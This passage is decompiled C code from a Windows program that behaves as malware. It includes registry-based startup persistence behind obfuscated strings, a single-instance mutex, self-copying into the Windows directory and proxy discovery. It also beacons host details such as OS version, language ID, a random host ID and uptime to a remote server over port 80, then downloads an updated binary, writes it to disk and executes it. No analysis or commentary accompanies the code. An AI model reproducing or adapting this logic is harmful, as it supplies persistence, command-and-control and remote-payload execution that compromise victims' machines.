    v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
    v8 = 0;
    if (v11 != 0) {
        // 0x40156d
        time_val = time((int32_t *)lpReserved);
        srand(time_val);
        v7 = rand();
        lpData2 = (int32_t)&g36;
        g36 = (int32_t **)v7;
        v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
        v8 = v10;
        // branch -> 0x401598
    }
    // 0x401598
    hKey = phkResult;
    g5 = v2;
    g3 = v1;
    if (hKey != lpReserved) {
        // 0x4015a0
        result = RegCloseKey((int32_t *)hKey);
        // branch -> 0x4015a9
    } else {
        result = v8;
    }
    // 0x4015a9
    return result;
}

// Address range: 0x4015ab - 0x4015d3
int32_t function_4015ab(void) {
    int32_t v1 = 0; // bp-8
    int32_t result = function_405908((int32_t *)-0x7ffffffe, (int32_t)"OUOPAIX?qnnajp?kjpnkhOapX?kjpnkhXHo]", (int32_t)"bkn_acqaop", 4, (int32_t)&v1, 4, 0); // 0x4015ca
    return result;
}

// Address range: 0x4015d4 - 0x4016a3
int32_t function_4015d4(int32_t lpValueName, int32_t a2) {
    int32_t ** v1 = (int32_t **)g6; // bp-524
    int32_t lpBuffer = 0; // bp-520
    GetWindowsDirectoryA((char *)&lpBuffer, 512);
    int32_t str = 0; // bp-517
    strcpy((char *)&str, (char *)&g11);
    strcat((char *)&lpBuffer, (char *)&g12);
    strcat((char *)&lpBuffer, g13);
    strcat((char *)&lpBuffer, (char *)&g48);
    int32_t Reserved = 0; // esi
    int32_t ** phkResult = NULL; // bp-8
    RegCreateKeyExA(HKEY_CURRENT_USER, "Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj", 0, (char *)&g68, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
    int32_t v2;
    if (a2 != 1) {
        int32_t hKey = *(int32_t *)&phkResult; // 0x40168a12
        v2 = RegDeleteValueA((int32_t *)hKey, (char *)lpValueName);
        // branch -> 0x401693
    } else {
        int32_t len = strlen((char *)&lpBuffer); // 0x401668
        g4 = &lpBuffer;
        int32_t v3 = RegSetValueExA((int32_t *)phkResult, (char *)lpValueName, Reserved, 1, (char *)&lpBuffer, len); // 0x40167f
        v2 = v3;
        // branch -> 0x401693
    }
    int32_t ** hKey2 = phkResult; // 0x401693
    int32_t v4 = (int32_t)hKey2; // 0x401693
    g6 = (int32_t)v1;
    int32_t result; // 0x4016a3
    if (v4 != Reserved) {
        // 0x401699
        *(int32_t *)&v1 = v4;
        result = RegCloseKey((int32_t *)hKey2);
        // branch -> 0x4016a2
    } else {
        result = v2;
    }
    // 0x4016a2
    return result;
}

// Address range: 0x4016a4 - 0x4018c0
int32_t function_4016a4(void) {
    int32_t v1 = g3; // 0x4016ad
    int32_t v2 = g6; // 0x4016ae
    g6 = (int32_t)"Ie_nkokbpVf";
    g3 = 0;
    int32_t * hObject = OpenMutexA(0x1f0001, false, "Ie_nkokbpVf"); // 0x4016bd
    int32_t lpMutexAttributes2 = g3; // 0x4016c3
    char * lpBuffer2;
    int32_t str; // bp-513
    int32_t lpBuffer; // bp-516
    if ((int32_t)hObject != lpMutexAttributes2) {
        int32_t v3 = g5; // 0x4016d5
        CloseHandle(hObject);
        g5 = (int32_t)&g35;
        if (lstrcmpiA((char *)&g35, "EATLHKNA*ATA") == 0) {
            // 0x4016f2
            if (lstrcmpiA((char *)&g48, "EATLHKNA*ATA") != 0) {
                // 0x401706
                ExitProcess(1);
                // UNREACHABLE
            }
        }
        // 0x40170e
        SetEvent(&((struct _SECURITY_ATTRIBUTES *)g22)->e0);
        WaitForSingleObject(&((struct _SECURITY_ATTRIBUTES *)g21)->e0, 0x1388);
        Sleep(500);
        lpBuffer = 0;
        GetWindowsDirectoryA((char *)&lpBuffer, 512);
        str = 0;
        strcpy((char *)&str, (char *)&g11);
        strcat((char *)&lpBuffer, (char *)&g12);
        strcat((char *)&lpBuffer, g13);
        strcat((char *)&lpBuffer, (char *)g5);
        SetFileAttributesA((char *)&lpBuffer, g3);
        DeleteFileA((char *)&lpBuffer);
        function_4015d4(g5, g3);
        int32_t lpMutexAttributes = g3; // 0x4017b0
        CreateMutexA((struct _SECURITY_ATTRIBUTES *)lpMutexAttributes, (lpMutexAttributes & 1) != 0, (char *)g6);
        g5 = (int32_t)(struct _SECURITY_ATTRIBUTES *)v3;
        lpBuffer2 = (char *)&lpBuffer;
        // branch -> 0x4017b9
    } else {
        // 0x4016c7
        CreateMutexA((struct _SECURITY_ATTRIBUTES *)lpMutexAttributes2, (lpMutexAttributes2 & 1) != 0, (char *)g6);
        lpBuffer2 = (char *)&lpBuffer;
        // branch -> 0x4017b9
    }
    int32_t lpFilename = 0; // bp-1540
    int32_t nameSize = GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)g3)->e0, (char *)&lpFilename, 1024); // 0x4017c6
    *(char *)(nameSize - 1536 + g2) = (char)g3;
    GetWindowsDirectoryA(lpBuffer2, 512);
    strcpy((char *)&str, (char *)&g11);
    g4 = (int32_t)&g11;
    CreateDirectoryA(lpBuffer2, (struct _SECURITY_ATTRIBUTES *)g3);
    strcat(lpBuffer2, (char *)&g12);
    function_401414((struct _SECURITY_ATTRIBUTES *)&lpBuffer);
    strcat(lpBuffer2, g13);
    g6 = (int32_t)&g48;
    strcat(lpBuffer2, (char *)&g48);
    if (lstrcmpiA((char *)&lpFilename, lpBuffer2) == 0) {
        // 0x4018ab
        function_4015d4(g6, 1);
        int32_t result = function_401454(1); // 0x4018b5
        g6 = v2;
        g3 = v1;
        return result;
    }
    // 0x401861
    function_4030c7();
    SetFileAttributesA(lpBuffer2, g3);
    CopyFileA((char *)&lpFilename, lpBuffer2, (g3 & 1) != 0);
    function_4047d2((struct _FILETIME *)&lpBuffer);
    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
    ExitProcess(1);
    // UNREACHABLE
}

// Address range: 0x4018c1 - 0x4018fe
int32_t function_4018c1(struct _OSVERSIONINFOA * a1) {
    int32_t lpVersionInformation = (int32_t)a1; // esi
    memset(&a1->e0, 0, 156);
    a1->e0 = 156;
    if (!GetVersionExA((struct _OSVERSIONINFOA *)lpVersionInformation)) {
        // 0x4018e7
        *(int32_t *)lpVersionInformation = 148;
        GetVersionExA((struct _OSVERSIONINFOA *)lpVersionInformation);
        // branch -> 0x4018f0
    }
    int16_t langId = GetSystemDefaultLangID(); // 0x4018f0
    g60 = langId;
    return langId;
}

// Address range: 0x4018ff - 0x4019e1
int32_t function_4018ff(void) {
    int32_t v1 = g5; // 0x40190d
    int32_t phkResult = 0; // bp-8
    int32_t v2 = 0; // ebx
    int32_t lpcbData = 4; // bp-12
    int32_t v3 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, 1, (int32_t **)&phkResult); // 0x401925
    if (v3 != 0) {
        // 0x4019db
        // branch -> 0x4019dd
        // 0x4019dd
        g5 = v1;
        return 0;
    }
    int32_t * lpReserved = (int32_t *)v2;
    int32_t v4 = RegQueryValueExA((int32_t *)phkResult, "ProxyEnable", lpReserved, lpReserved, (char *)&g59, &lpcbData); // 0x40194c
    lpcbData = 256;
    int32_t * lpReserved2 = (int32_t *)v2;
    int32_t lpData; // bp-268
    int32_t v5 = RegQueryValueExA((int32_t *)phkResult, "ProxyServer", lpReserved2, lpReserved2, (char *)&lpData, &lpcbData); // 0x40196c
    RegCloseKey((int32_t *)phkResult);
    if (v4 != v2 || v5 != v2 || (int32_t)g59 == v2) {
        // 0x4019db
        // branch -> 0x4019dd
        // 0x4019dd
        g5 = v1;
        return 0;
    }
    int32_t substr_pos = (int32_t)strstr((char *)&lpData, "http="); // 0x401995
    g4 = (int32_t)"http=";
    int32_t str;
    if (substr_pos != v2) {
        // 0x4019a3
        str = substr_pos + 5;
        // branch -> 0x4019ae
    } else {
        str = &lpData;
    }
    char * found_char_pos = strchr((char *)str, 58); // 0x4019b1
    *found_char_pos = (char)v2;
    strcpy((char *)&g57, (char *)str);
    g58 = atoi((char *)((int32_t)found_char_pos + 1));
    // branch -> 0x4019dd
    // 0x4019dd
    g5 = v1;
    return 1;
}

// Address range: 0x4019e2 - 0x401baa
int32_t function_4019e2(struct sockaddr * a1, int32_t protocol, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x4019e2
    g1 = 0x2128;
    function_405a10();
    int32_t v1 = g3; // 0x4019ef
    int32_t v2 = g6; // 0x4019f0
    int32_t timeout = v2; // bp-12
    int32_t v3 = g5; // 0x4019f1
    int32_t v4 = v3; // bp-16
    int32_t cp = function_4028cc((char *)a1, v3, v2, v1); // 0x4019f5
    g4 = (int32_t)(struct timeval *)a1;
    inet_addr((char *)cp);
    g3 = 0;
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, protocol); // 0x401a14
    g6 = sock_fd;
    int32_t result; // 0x401baa
    if (sock_fd == -1) {
        result = 0;
        // branch -> 0x401ba6
    } else {
        // 0x401a25
        v4 = 1;
        ioctlsocket(sock_fd, -0x7ffb9982, &v4);
        int32_t v5 = g3; // 0x401a3c
        timeout = 60;
        char * writefds = (char *)1; // bp-300
        if ((int32_t)g59 == v5) {
            // 0x401a6e
            g5 = -0x7ffb9982;
            // branch -> 0x401a74
        } else {
            // 0x401a5e
            g5 = inet_addr((char *)1);
            // branch -> 0x401a74
        }
        // 0x401a74
        connect((int32_t)htons(2), (struct sockaddr *)g5, g6);
        g4 = (int32_t)&writefds;
        struct fd_set * readfds = (struct fd_set *)g3; // 0x401aa2
        uint32_t v6 = select(g6 + 1, readfds, (struct fd_set *)&writefds, readfds, (struct timeval *)&timeout); // 0x401aa6
        if (v6 >= 1) {
            // 0x401ab0
            int32_t str; // bp-8492
            function_40267d((char *)(0x10000 * (int32_t)&str / 0x10000), (int32_t)a1, protocol, a3, a8, a5);
            int32_t len = strlen((char *)&str); // 0x401ad2
            memcpy((int32_t *)(len - 0x2128 + g2), (int32_t *)a4, a5);
            int32_t length = len + a5; // 0x401af2
            g5 = length;
            send(g6, (char *)&str, length, g3);
            if (a8 != 1) {
                int32_t v7 = g6; // 0x401b33
                int32_t v8 = function_40277e(v7); // 0x401b34
                g4 = (int32_t)(struct timeval *)v7;
                if (v8 != -1) {
                    // 0x401b3f
                    if (v8 < 0x3e800) {
                        int32_t v9 = 0; // edi
                        // branch -> 0x401b48
                        while (true) {
                            struct fd_set * writefds2 = (struct fd_set *)g3; // 0x401b4c
                            int32_t v10 = select(g6 + 1, (struct fd_set *)&writefds, writefds2, writefds2, (struct timeval *)&timeout); // 0x401b59
                            if (v10 < 1) {
                                // 0x401b28
                                closesocket(g6);
                                result = g3;
                                // branch -> 0x401ba6
                                // 0x401ba6
                                g5 = v4;
                                g6 = timeout;
                                g3 = v5;
                                return result;
                            }
                            int32_t v11 = v9; // 0x401b69
                            int32_t v12 = recv(g6, (char *)(v11 + a6), 0x3e800 - v11, g3); // 0x401b73
                            if (v12 == -1) {
                                // 0x401b9d
                                closesocket(g6);
                                // branch -> 0x401ba4
                                // 0x401ba4
                                // branch -> 0x401ba6
                                // 0x401ba6
                                g5 = v4;
                                g6 = timeout;
                                g3 = v5;
                                return 0;
                            }
                            // 0x401b7e
                            if (v12 != g3) {
                                int32_t v13 = v9 + v12; // 0x401b82
                                v9 = v13;
                                if (v13 >= 0x3e800) {
                                    // break -> 0x401b8c
                                    break;
                                }
                                // continue -> 0x401b48
                                continue;
                            }
                            // 0x401b8c
                            closesocket(g6);
                            *(int32_t *)a7 = v9;
                            // branch -> 0x401ba6
                            // 0x401ba6
                            g5 = v4;
                            g6 = timeout;
                            g3 = v5;
                            return (int32_t)(struct timeval *)1;
                        }
                        // 0x401b8c
                        closesocket(g6);
                        *(int32_t *)a7 = v9;
                        // branch -> 0x401ba6
                        // 0x401ba6
                        g5 = v4;
                        g6 = timeout;
                        g3 = v5;
                        return (int32_t)(struct timeval *)1;
                    }
                }
                // 0x401b9d
                closesocket(g6);
                // branch -> 0x401ba4
                // 0x401ba4
                result = 0;
                // branch -> 0x401ba6
            } else {
                struct fd_set * readfds2 = (struct fd_set *)g3; // 0x401b14
                uint32_t v14 = select(g6 + 1, readfds2, (struct fd_set *)&writefds, readfds2, (struct timeval *)&timeout); // 0x401b1b
                if (v14 >= 1) {
                    // 0x401b25
                    g3 = 1;
                    // branch -> 0x401b28
                }
                // 0x401b28
                closesocket(g6);
                result = g3;
                // branch -> 0x401ba6
            }
            // 0x401ba6
            g5 = v4;
            g6 = timeout;
            g3 = v5;
            return result;
        }
        // 0x401b28
        closesocket(g6);
        v1 = v5;
        result = g3;
        // branch -> 0x401ba6
    }
    // 0x401ba6
    g5 = v4;
    g6 = timeout;
    g3 = v1;
    return result;
}

// Address range: 0x401bab - 0x401c02
int32_t function_401bab(void) {
    int32_t v1 = g4; // bp-4
    int32_t v2 = g6; // 0x401bac
    int32_t v3 = g5; // 0x401bad
    int32_t * mem = malloc(0x3e800); // 0x401bb3
    int32_t v4 = (int32_t)mem; // 0x401bb3
    g6 = v4;
    g5 = 0;
    g4 = 0x3e800;
    int32_t result;
    if (mem != NULL) {
        int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g47, (int32_t)&g68, 0, v4, (int32_t)&v1, 0); // 0x401bdf
        int32_t * v6 = (int32_t *)g6;
        if (v5 != 0) {
            // 0x401beb
            g37 = *v6;
            g5 = 1;
            // branch -> 0x401bf5
        }
        // 0x401bf5
        free(v6);
        result = g5;
        // branch -> 0x401bff
    } else {
        // 0x401bc2
        result = 0;
        // branch -> 0x401bff
    }
    // 0x401bff
    g5 = v3;
    g6 = v2;
    return result;
}

// Address range: 0x401c03 - 0x401dee
int32_t function_401c03(void) {
    struct in_addr in; // 0x401dce
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g3; // 0x401c0c
    int32_t v3 = g6; // 0x401c0d
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x401c13
    int32_t (*func)() = GetProcAddress(moduleHandle, "GetTickCount"); // 0x401c21
    FreeLibrary((int32_t *)(int32_t)moduleHandle);
    int32_t * mem = malloc(0x3e800); // 0x401c35
    g4 = 0x3e800;
    if (mem == NULL) {
        // 0x401deb
        g6 = v3;
        g3 = v2;
        g2 = v1;
        return (int32_t)mem;
    }
    int32_t str = 0; // bp-1296
    strcpy((char *)&str, (char *)&g64);
    int32_t len = strlen((char *)(int32_t)&g64); // 0x401c5b
    strcpy((char *)(len - 1291 + g2), (char *)&g63);
    int32_t v4 = strlen((char *)(int32_t)&g63) + 1 + len + 1; // 0x401c7c
    memcpy((int32_t *)(v4 - 1292 + g2), (int32_t *)&g61, 156);
    int32_t v5 = 156 + v4; // 0x401c9e
    int32_t str2 = (int32_t)"10.14"; // edi
    *(int16_t *)(v5 - 1292 + g2) = g60;
    *(char *)(v5 - 1290 + g2) = (char)(g59 != NULL);
    int32_t v6 = v5 + 2; // 0x401cc6
    *(int32_t *)(v6 - 1291 + g2) = (int32_t)g36;
    int32_t v7 = v6 + 1; // 0x401cce
    strcpy((char *)(v7 - 1288 + g2), (char *)str2);
    int32_t len2 = strlen((char *)str2); // 0x401cdf
    int32_t v8 = len2 + 1 + v7 + 4; // esi
    __pseudo_call((int32_t)func);
    g4 = 0x36ee80;
    uint32_t v9 = (int32_t)((int64_t)len2 % 0x36ee80) / 0xea60;
    int32_t str3 = 0; // bp-272
    sprintf((char *)&str3, "%u:%u", len2 / 0x36ee80, v9);
    strcpy((char *)(g2 - 1292 + v8), (char *)&str3);
    g6 = strlen((char *)&str3) + 1 + v8;
    strcpy((char *)&str3, (char *)&g47);
    char * found_char_pos = strrchr((char *)&str3, 47); // 0x401d5d
    g5 = (int32_t)&g50;
    int32_t str4 = g2 - 1292 + g6; // 0x401d68
    g3 = str4;
    strcpy((char *)str4, (char *)&g50);
    int32_t v10; // 0x401dbf
    if (found_char_pos == NULL) {
        // 0x401c47
        v10 = g6;
        // branch -> 0x401db0
    } else {
        // 0x401d83
        *found_char_pos = 0;
        strcat((char *)g3, (char *)&str3);
        g5 = strlen((char *)g5);
        int32_t v11 = g6 + strlen((char *)&str3) + 2 + g5; // 0x401dac
        g6 = v11;
        v10 = v11;
        // branch -> 0x401db0
    }
    int32_t v12 = 0; // bp-16
    char * v13 = (char *)&v12; // bp-1320
    in = (struct in_addr){
        .e0 = 0
    };
    in.e0 = g37;
    char * v14 = inet_ntoa(in); // 0x401dce
    int32_t result = function_4019e2((struct sockaddr *)v14, 80, (int32_t)&g68, (int32_t)&str, v10, (int32_t)mem, (int32_t)v13, (int32_t)(char *)1); // 0x401dd5
    free(mem);
    g5 = (int32_t)(char *)0x401ced;
    // branch -> 0x401deb
    // 0x401deb
    g6 = v3;
    g3 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x401def - 0x401e4b
int32_t function_401def(void) {
    int32_t v1 = g4; // bp-8
    int32_t v2 = g6; // 0x401df3
    int32_t v3 = g5; // 0x401df4
    int32_t * mem = malloc(0x3e800); // 0x401dfa
    int32_t v4 = (int32_t)mem; // 0x401dfa
    g6 = v4;
    g5 = 0;
    g4 = 0x3e800;
    int32_t result;
    if (mem != NULL) {
        int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g46, (int32_t)&g68, 0, v4, (int32_t)&v1, 0); // 0x401e25
        if (v5 != 0) {
            // 0x401e31
            g5 = function_401e4c(g6, v1);
            // branch -> 0x401e3e
        }
        // 0x401e3e
        free((int32_t *)g6);
        result = g5;
        // branch -> 0x401e48
    } else {
        // 0x401e09
        result = 0;
        // branch -> 0x401e48
    }
    // 0x401e48
    g5 = v3;
    g6 = v2;
    return result;
}

// Address range: 0x401e4c - 0x401e98
int32_t function_401e4c(int32_t str, int32_t a2) {
    int32_t v1 = 0; // ebx
    int32_t result;
    if (a2 > 0) {
        int32_t str2 = (int32_t)&g64; // esi
        int32_t len; // 0x401e7e
        int32_t v2; // 0x401e86
        if (strcmp((char *)str, (char *)&g64) != 0) {
            while (true) {
                int32_t v3 = v1 + 1; // 0x401e70
                v1 = v3;
                if (v3 >= a2) {
                    // 0x401e77
                    // branch -> 0x401e79
                    // 0x401e79
                    return 0;
                }
                // 0x401e70
                if (strcmp((char *)(v3 + str), (char *)str2) == 0) {
                    // break -> 0x401e7d
                    break;
                }
                // continue -> 0x401e70
            }
            // 0x401e7d
            len = strlen((char *)str2);
            v2 = *(int32_t *)(v1 + len + 1 + str);
            // branch -> 0x401e79
            // 0x401e79
            return v2 == (int32_t)g36;
        }
        // 0x401e7d
        len = strlen((char *)str2);
        v2 = *(int32_t *)(v1 + len + 1 + str);
        result = v2 == (int32_t)g36;
        // branch -> 0x401e79
    } else {
        // 0x401e77
        result = 0;
        // branch -> 0x401e79
    }
    // 0x401e79
    return result;
}

// Address range: 0x401e99 - 0x401f44
int32_t function_401e99(char * a1, int32_t a2) {
    int32_t v1 = g2; // 0x401e9a
    int32_t v2 = g6; // 0x401e9b
    int32_t v3 = g5; // 0x401e9c
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x401ea2
    int32_t func = (int32_t)GetProcAddress(moduleHandle, "GetTickCount"); // 0x401eb0
    int32_t v4 = FreeLibrary(moduleHandle); // eax
    int32_t v5 = 0; // ebx
    int32_t v6 = 2 * (a2 + 0x3a98 + 4 * a2); // esi
    struct _PROCESS_INFORMATION * v7 = (struct _PROCESS_INFORMATION *)0x401ed0; // bp-20
    __pseudo_call(func);
    int32_t v8 = 0; // ebp
    g33 = v4;
    int32_t result; // 0x401f3a
    if (a2 > 0) {
        // 0x401edb
        if (g24 == 0) {
            int32_t v9 = v5; // 0x401ee6
            int32_t flags = 0; // 0x401ee523
            int32_t v10 = a2; // 0x401ee322
            // branch -> 0x401ee3
            while (true) {
                int32_t buf = v9 + (int32_t)a1; // 0x401eed
                int32_t sock = *(int32_t *)&g34; // 0x401ef01
                int32_t v11 = send(sock, (char *)buf, v10 - v9, flags); // 0x401ef6
                int32_t v12; // 0x401f2f
                int32_t v13; // 0x401f1f
                if (v11 == -1) {
                    // 0x401f01
                    if (WSAGetLastError() == 0x2733) {
                        // 0x401f0e
                        Sleep(1);
                        int32_t v14 = v6; // 0x401f16
                        v6 = v14 - 1;
                        if (v14 != 0) {
                            // 0x401f0e
                            v12 = a2;
                            v13 = v5;
                            // branch -> 0x401f2f
                            goto lab_0x401f2f;
                        }
                    }
                    // 0x401f3b
                    g66 = (struct _OVERLAPPED *)v8;
                    // branch -> 0x401f41
                    // 0x401f41
                    // branch -> 0x401f36
                    // 0x401f36
                    g5 = (int32_t)v7;
                    g6 = v3;
                    g2 = v2;
                    g3 = v1;
                    return 0;
                }
                // 0x401f1f
                v13 = v5 + v11;
                v5 = v13;
                v6 = 10 * (a2 - v13 + 3000);
                v12 = a2;
                // branch -> 0x401f2f
              lab_0x401f2f:
                // 0x401f2f
                if (v13 >= v12) {
                    // 0x401f33
                    // branch -> 0x401f36
                    // 0x401f36
                    g5 = (int32_t)v7;
                    g6 = v3;
                    g2 = v2;
                    g3 = v1;
                    return 1;
                }
                // 0x401f2f
                if (g24 != v8) {
                    // break -> 0x401f41
                    break;
                }
                v9 = v13;
                flags = v8;
                v10 = v12;
                // continue -> 0x401ee3
                continue;
            }
            // 0x401f41
            // branch -> 0x401f36
            // 0x401f36
            g5 = (int32_t)v7;
            g6 = v3;
            g2 = v2;
            g3 = v1;
            return 0;
        }
        // 0x401f41
        result = 0;
        // branch -> 0x401f36
    } else {
        // 0x401f33
        result = 1;
        // branch -> 0x401f36
    }
    // 0x401f36
    g5 = (int32_t)v7;
    g6 = v3;
    g2 = v2;
    g3 = v1;
    return result;
}

// Address range: 0x401f45 - 0x402005
int32_t function_401f45(char * a1, int32_t a2) {
    struct in_addr in; // 0x401fc0
    int32_t v1 = g3; // 0x401f4e
    int32_t v2 = g6; // 0x401f4f
    g6 = (int32_t)a1;
    g3 = 0;
    int32_t str; // bp-516
    int32_t result; // 0x402005
    int32_t v3; // 0x401fae
    int32_t len; // 0x401fda
    char * v4; // 0x401fc0
    if (*a1 == 65) {
        // 0x401f99
        memset(&str, 0, 512);
        v3 = *(int32_t *)(g6 + 1);
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = g37;
        v4 = inet_ntoa(in);
        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
        len = strlen((char *)&str);
        if (function_401e99((char *)&str, len) != 0) {
            // 0x401ff7
            result = function_401e99((char *)g6, a2);
            // branch -> 0x402002
        } else {
            // 0x401ff3
            result = 0;
            // branch -> 0x402002
        }
        // 0x402002
        g6 = v2;
        g3 = v1;
        return result;
    }
    // 0x401f5a
    if (g53 == NULL) {
        // 0x401f99
        memset(&str, 0, 512);
        v3 = *(int32_t *)(g6 + 1);
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = g37;
        v4 = inet_ntoa(in);
        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
        len = strlen((char *)&str);
        if (function_401e99((char *)&str, len) != 0) {
            // 0x401ff7
            result = function_401e99((char *)g6, a2);
            // branch -> 0x402002
        } else {
            // 0x401ff3
            result = 0;
            // branch -> 0x402002
        }
        // 0x402002
        g6 = v2;
        g3 = v1;
        return result;
    }
    // 0x401f62
    g52 = 1;
    g51 = 0;
    closesocket(*(int32_t *)&g34);
    int32_t result2; // 0x401ffb
    if (g51 != g3) {
        // 0x401f90
        if (function_4028eb() != 0) {
            // 0x401f90
            // branch -> 0x401f99
            // 0x401f99
            memset(&str, g3, 512);
            v3 = *(int32_t *)(g6 + 1);
            in = (struct in_addr){
                .e0 = 0
            };
            in.e0 = g37;
            v4 = inet_ntoa(in);
            function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
            len = strlen((char *)&str);
            if (function_401e99((char *)&str, len) != 0) {
                // 0x401ff7
                result2 = function_401e99((char *)g6, a2);
                // branch -> 0x402002
                // 0x402002
                g6 = v2;
                g3 = v1;
                return result2;
            }
        }
        // 0x401ff3
        // branch -> 0x402002
        // 0x402002
        g6 = v2;
        g3 = v1;
        return 0;
    }
    Sleep(1);
    while (g51 == g3) {
        // 0x401f86
        Sleep(1);
        // continue -> 0x401f86
    }
    // 0x401f90
    if (function_4028eb() != 0) {
        // 0x401f90
        // branch -> 0x401f99
        // 0x401f99
        str = 0;
        memset(&str, g3, 512);
        v3 = *(int32_t *)(g6 + 1);
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = g37;
        v4 = inet_ntoa(in);
        function_40267d((char *)&str, (int32_t)v4, 81, (int32_t)&g68, 1, v3);
        len = strlen((char *)&str);
        if (function_401e99((char *)&str, len) != 0) {
            // 0x401ff7
            result2 = function_401e99((char *)g6, a2);
            // branch -> 0x402002
            // 0x402002
            g6 = v2;
            g3 = v1;
            return result2;
        }
    }
    // 0x401ff3
    // branch -> 0x402002
    // 0x402002
    g6 = v2;
    g3 = v1;
    return 0;
}

// Address range: 0x402006 - 0x40205b
int32_t function_402006(void) {
    int32_t v1 = g4; // bp-4
    int32_t v2 = g5; // 0x402007
    int32_t * mem = malloc(0x3e800); // 0x40200d
    int32_t result = (int32_t)mem; // 0x40200d
    g5 = result;
    g4 = 0x3e800;
    if (mem == NULL) {
        // 0x402059
        g5 = v2;
        return result;
    }
    int32_t v3 = g6; // 0x40201a
    g6 = (int32_t)&g49;
    int32_t v4 = function_4019e2((struct sockaddr *)&g49, 80, (int32_t)&g40, (int32_t)&g68, 0, result, (int32_t)&v1, 0); // 0x402037
    if (v4 != 0) {
        // 0x402043
        strcpy((char *)&g50, (char *)g6);
        // branch -> 0x402050
    }
    // 0x402050
    free(mem);
    g6 = v3;
    // branch -> 0x402059
    // 0x402059
    g5 = v2;
    int32_t * v5;
    return (int32_t)&v5;
}

// Address range: 0x40205c - 0x40216e
int32_t function_40205c(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g3; // 0x402065
    int32_t * mem = malloc(0x3e800); // 0x40206b
    int32_t v3 = (int32_t)mem; // 0x40206b
    g3 = 0;
    struct _SECURITY_ATTRIBUTES * v4 = NULL; // bp-8
    *(int32_t *)&v4 = v3;
    int32_t result; // 0x40216e
    if (mem != NULL) {
        int32_t v5 = g6; // bp-1048
        int32_t v6 = g5; // 0x402083
        int32_t nNumberOfBytesToWrite; // bp-12
        int32_t v7 = &nNumberOfBytesToWrite; // 0x402084
        g4 = v7;
        g5 = (int32_t)&g68;
        g6 = (int32_t)&g50;
        int32_t v8 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g45, (int32_t)&g68, 0, v3, v7, 0); // 0x40209e
        if (v8 != 0) {
            // 0x4020ae
            *(char *)(nNumberOfBytesToWrite + v3) = (char)g3;
            struct _OVERLAPPED * str = (struct _OVERLAPPED *)"10.14"; // 0x4020bd
            int32_t strcmp_rc = strcmp((char *)(struct _SECURITY_ATTRIBUTES *)mem, (char *)str); // 0x4020bd
            g4 = (int32_t)str;
            struct _SECURITY_ATTRIBUTES * v9; // 0x40215e
            if (strcmp_rc == 0) {
                // 0x4020ae
                v9 = v4;
                // branch -> 0x40215e
            } else {
                int32_t v10 = g3; // 0x4020cf
                int32_t v11 = *(int32_t *)&v4; // 0x4020d111
                struct _SECURITY_ATTRIBUTES * v12 = (struct _SECURITY_ATTRIBUTES *)v11;
                int32_t v13 = function_4019e2((struct sockaddr *)g6, 80, (int32_t)&g44, g5, v10, v11, v7, v10); // 0x4020de
                if (v13 != 0) {
                    int32_t lpBuffer = 0; // bp-1040
                    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
                    strcat((char *)&lpBuffer, "Xjapor_*ata");
                    int32_t dwShareMode = g3; // 0x402115
                    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, &((struct _OVERLAPPED *)dwShareMode)->e0); // 0x402122
                    g6 = (int32_t)fileHandle;
                    if (fileHandle != (int32_t *)-1) {
                        int32_t lpNumberOfBytesWritten = 0; // bp-16
                        bool v14 = WriteFile(fileHandle, &v12->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x40213b
                        g5 = v14;
                        CloseHandle(&((struct _OVERLAPPED *)g6)->e0);
                        if (g5 != g3) {
                            // 0x40214e
                            function_40511a((struct _STARTUPINFOA *)&lpBuffer);
                            g3 = 1;
                            v9 = v12;
                            // branch -> 0x40215e
                        } else {
                            v9 = v12;
                        }
                    } else {
                        v9 = v12;
                    }
                } else {
                    v9 = v12;
                }
            }
            // 0x40215e
            free(&v9->e0);
            g5 = v6;
            g6 = v5;
            result = g3;
            // branch -> 0x40216c
            // 0x40216c
            g3 = v2;
            g2 = v1;
            return result;
        }
        // 0x40215e
        free(&((struct _SECURITY_ATTRIBUTES *)mem)->e0);
        g5 = v6;
        g6 = v5;
        result = g3;
        // branch -> 0x40216c
    } else {
        // 0x40207b
        result = 0;
        // branch -> 0x40216c
    }
    // 0x40216c
    g3 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x40216f - 0x4022ea
int32_t function_40216f(void) {
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g3; // 0x402178
    int32_t v3 = g6; // 0x402179
    int32_t v4 = g5; // 0x40217a
    int32_t * mem = malloc(0x3e800); // 0x402180
    int32_t v5 = (int32_t)mem; // 0x402180
    g6 = v5;
